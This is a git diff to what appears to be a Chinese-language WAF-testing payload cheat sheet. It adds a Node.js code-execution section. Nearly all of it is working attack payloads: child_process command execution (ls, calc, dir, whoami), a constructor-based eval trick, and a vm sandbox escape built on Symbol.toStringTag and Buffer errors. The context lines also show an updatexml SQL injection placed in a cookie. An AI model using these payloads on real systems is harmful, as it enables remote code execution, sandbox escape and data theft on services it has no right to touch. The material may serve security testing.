@@ -248,6 +248,36 @@ Cookie: JSESSIONID=updatexml(1,concat(0x7e,user(),0x7e),1)=1
 CMD:updatexml(1,concat(0x7e,user(),0x7e),1)
 ```
 
+# Nodejs 代码执行
+```
+命令执行
+require('child_process').exec('ls -la /tmp', function(error, stdout, stderr) { console.log(stdout) });
+
+global.process.mainModule.constructor._load('child_process').exec('calc');
+
+Math=Math.constructor,
+Math.constructor("return process.mainModule.require('child_process').execSync('dir').toString()")()
+
+
+
+沙箱逃逸
+Symbol = {
+  get toStringTag(){
+    throw f=>f.constructor("return process")()
+  }
+};
+try{
+  Buffer.from(new Map());
+}catch(f){
+  Symbol = {};
+  f(()=>{}).mainModule.require("child_process").execSync("whoami").toString();
+}
+
+
+```
+
+
+
 
 # 多层编码 自动解码三层 WAF6.8 更新了这个功能
 ```
